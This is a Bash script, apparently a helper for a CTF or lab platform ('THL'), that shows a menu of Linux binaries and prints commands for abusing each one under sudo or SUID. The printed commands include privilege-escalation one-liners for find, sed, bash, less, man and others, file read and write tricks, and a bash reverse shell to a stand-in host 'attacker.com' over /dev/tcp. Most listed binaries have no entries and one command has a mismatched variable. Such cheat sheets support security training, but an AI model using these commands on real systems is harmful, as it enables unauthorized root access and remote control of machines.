#!/bin/bash
# Nombre : Binscrack
# Version : 1.0.0 
# Creador : wvverez
# Repo : https://github.com/wvverez

RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
BLUE='\e[1;34m'
MAGENTA='\e[1;35m'
CYAN='\e[1;36m'
RESET='\e[0m'

cleanup() {
        printf "\n${RED}[+] Abandonando el script ...${RESET}\n"
        exit 1
}

trap cleanup SIGINT

while true; do
	clear

printf "${RED}
 ██████╗ ██╗███╗   ██╗███████╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗
██╔══██╗██║████╗  ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██████╔╝██║██╔██╗ ██║███████╗██║     ██████╔╝███████║██║     █████╔╝ 
██╔══██╗██║██║╚██╗██║╚════██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
██████╔╝██║██║ ╚████║███████║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                     
${RESET}"
printf "${MAGENTA}Version : 1.0.0${RESET}\n\n"
printf "${RED}---------------------------------------------------------------------------${RESET}\n\n"
printf "${RED}[-] Abuso de permisos sudoers - Plataforma THL${RESET}\n\n"
printf "${RED}[-] https://github.com/wvverez${RESET}\n\n"
printf "${RED}[-] Creador : @wvverez${RESET}\n\n"
printf "${RED}----------------------------------------------------------------------------${RESET}\n\n"  


opciones=("7z" "find" "sed" "neofetch" "bash" "nft" "more" "logsave" "less" "man" "pg" "red" "script" "service" "ss" "systemctl" "tail" "task" "tbl" "tee" "uniq" "uuencode" "uudecode" "vi" "xargs" "xxd" "crash" "curl" "debugfs" "base64" "npm" "posh" "rake" "rlwrap" "sash" "setarch" "tail" "tar" "task" "tcpdump")

columnas=10
i=0

printf "${YELLOW}\uf071 Elige binario a abusar${RESET}\n\n"

for binario in "${opciones[@]}"; do
    printf "${CYAN}%2d)${RESET} ${GREEN}%-12s${RESET}  " "$((i+1))" "$binario"
    ((i++))
    if (( i % columnas == 0 )); then
        echo
        echo
    fi
done

# salto final si la última fila no llegó a 10
if (( i % columnas != 0 )); then
    echo
    echo
fi

printf "${RED}Selecciona numero :${RESET}\n\n"
read opcion

case $opcion in

1)
    printf "${GREEN}[+] Binario seleccionado... :${RESET} ${CYAN}7z${RESET}\n\n"
    printf "${YELLOW}Como abusar de el:${RESET}\n"

    printf "${RED}[+] SUDO${RESET}\n"
    echo ""
    printf "LFILE=file_to_read\n"
	echo ""
    printf "sudo 7z a -ttar -an -so \$LFILE | 7z e -ttar -si -so\n"
    echo ""
    printf "${RED}[+] FILEREAD${RESET}\n"
    echo ""
    printf "LFILE=file_to_read\n"
    echo ""
    printf "7z a -ttar -an -so \$LFILE | 7z e -ttar -si -so\n"
    ;;


2)
    printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}find${RESET}\n\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n\n"

	printf "${RED}[+] SUDO ${RESET}\n"
	echo ""
	printf "sudo find . -exec /bin/sh \\; -quit\n\n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}\n"
	echo ""
	printf "find . -exec /bin/sh \\; -quit\n\n"
	echo ""
	printf "${RED}[+] SUID ${RESET}\n"
	echo ""
	printf "sudo install -m =xs \$(which find) .\n"
	echo ""
	printf "./find . -exec /bin/sh -p \\; -quit\n\n"
	echo ""
	printf "${RED}[+] FILEWRITE ${RESET}\n"
	echo ""
	printf "LFILE=file_to_write\n"
	echo ""
	printf "find / -fprintf \"\$FILE\" DATA -quit\n"
	;;

3)
    printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}sed${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "sudo sed -n '1e exec sh 1>&0' /etc/hosts\n\n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}\n\n"
	echo ""
	printf "sed -n '1e exec sh 1>&0' /etc/hosts\n"
	echo ""
	printf "sed e\n\n"
	echo ""
	printf "${RED}[+] SUID ${RESET}\n\n"
	echo ""
	printf "sudo install -m =xs \$(which sed) .\n"
	echo ""
	printf "LFILE=file_to_read\n"
	echo ""
	printf "./sed -e '' \"\$LFILE\"\n\n"
	echo ""
	printf "${RED}[+] FILEREAD ${RESET}\n\n"
	echo ""
	printf "LFILE=file_to_read\n"
	echo ""
	printf "sed '' \"\$LFILE\"\n\n"
	echo ""
	printf "${RED}[+] FILEWRITE ${RESET}\n\n"
	echo ""
	printf "LFILE=file_to_write\n"
	echo ""
	printf "sed -n \"1s/.*/DATA/w \$LFILE\" /etc/hosts\n"
    ;;

4)
    printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}neofetch${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "TF=\$(mktemp)\n"
	echo ""
	printf "echo 'exec /bin/sh' >\$TF\n"
	echo ""
	printf "sudo neofetch --config \$TF\n\n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}\n\n"
	echo ""
	printf "TF=\$(mktemp)\n"
	echo ""
	printf "echo 'exec /bin/sh' >\$TF\n"
	echo ""
	printf "neofetch --config \$TF\n\n"
	echo ""
	printf "${RED}[+] FILEREAD ${RESET}\n\n"
	echo ""
	printf "LFILE=file_to_read\n"
	echo ""
	printf "neofetch --ascii \$LFILE\n"
	;;
    
5)
	printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}bash${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "sudo bash\n"
	echo "" 
	printf "${RED}[+] SHELL ${RESET}\n\n"
	echo ""
	printf "bash\n"
	echo ""
	printf "${RED}[+] REVERSE SHELL ${RESET}\n\n"
	echo ""
	printf "export RHOST=attacker.com\n"
	echo ""
	printf "export RPORT=12345\n"
	echo "" 
	printf "bash -c 'exec bash -i &>/dev/tcp/\$RHOST/\$RPORT <&1'"
	echo ""
	printf "${RED}[+] LIBRARY LOAD ${RESET}\n\n"
	echo ""
	printf "bash -c 'enable -f ./lib.so x'\n"
	echo ""
	printf "${RED}[+] SUID ${RESET}\n\n"
	echo ""
	printf "sudo install -m =xs \$(which bash) .\n"
	echo ""
	printf "./bash -p\n"
	echo ""
	;;

6) 

	printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}nft${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "LFILE=file_to_read\n"
	echo ""
	printf "sudo nft -f \"\$LFILE\"\n\n"
	echo ""
	printf "${RED}[+] SUID ${RESET}\n\n"
	echo ""
	printf "sudo install -m =xs \$(which nft) .\n"
	echo ""
	printf "LFILE=file_to_read\n"
	echo ""
	printf "./nft -f \"\$LFILE\"\n\n"
	echo ""
	printf "${RED}[+] FILEREAD ${RESET}\n\n"
	echo ""
	printf "LFILE=file_to_read\n"
	echo ""
	printf "nft -f \"\$LFILE\"\n"
	;;
7) 

	printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}more${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "TERM= sudo more /etc/profile\n"
	echo ""
	printf "!/bin/sh\n"
	echo ""
	printf "${RED}[+] SUID ${RESET}\n\n"
	echo ""
	printf "sudo install -m =xs \$(which more) .\n"
	echo ""
	printf "./more file_to_read\n"
	echo ""
	printf "${RED}[+] FILEREAD ${RESET}\n\n"
	echo ""
	printf "more file_to_read\n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}\n\n"
	echo ""
	printf "TERM= more /etc/profile\n"
	echo ""
	printf "!/bin/sh\n"
	echo ""
	;;

8) 

	printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}logsave${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "sudo logsave /dev/null /bin/sh -i\n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}\n\n"
	echo ""
	printf "logsave /dev/null /bin/sh -i\n"
	echo ""
	printf "${RED}[+] SUID ${RESET}\n\n"
	echo "" 
	printf "sudo install -m =xs \$(which logsave) .\n"
	echo ""
	printf "./logsave /dev/null /bin/sh -i -p\n"
	echo ""
	;;

9)

	printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}less${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "sudo less /etc/profile\n"
	echo ""
	printf "!/bin/sh\n"
	echo ""
	printf "${RED}[+] SUID ${RESET}\n\n"
	echo ""
	printf "sudo install -m =xs \$(which less) .\n"
	echo ""
	printf "./less file_to_read\n"
	;;

10)

	printf "${GREEN}Binario seleccionado... :${RESET} ${CYAN}man${RESET}\n"
	printf "${YELLOW}Como abusar de el:${RESET}\n"

	printf "${RED}[+] SUDO ${RESET}\n\n"
	echo ""
	printf "sudo man man\n"
	echo ""
	printf "!/bin/sh\n"
	echo ""
	printf "${RED}[+] FILEREAD ${RESET}\n\n"
	echo ""
	printf "man file_to_read\n"
	echo ""
	printf "${RED}[+] SHELL ${RESET}\n\n"
	echo ""
	printf "man man && !/bin/sh\n"
	echo "" 
	printf "man '-H/bin/sh #' man\n"
	echo ""
	;;

11)

	printf "${GREEN}Elegiste:${RESET} ${CYAN}pg${RESET}\n"
	;;

12) 

	printf "${GREEN}Elegiste:${RESET} ${CYAN}red${RESET}\n"
	;;

13)
	printf "${GREEN}Elegiste:${RESET} ${CYAN}script${RESET}\n"
	;;

*)
    printf "${RED}Binario no encontrado...${RESET}\n"
    ;;
esac

echo ""


read -p "$(printf "${GREEN}¿Quieres elegir otro binario? (Y/N): ${RESET}")" again

case "$again" in
    Y|y)
        continue
        ;;
    N|n)
        cleanup
        ;;
    *)
        printf "${RED}Respuesta no válida. Saliendo...${RESET}\n"
        cleanup
        ;;
esac

done
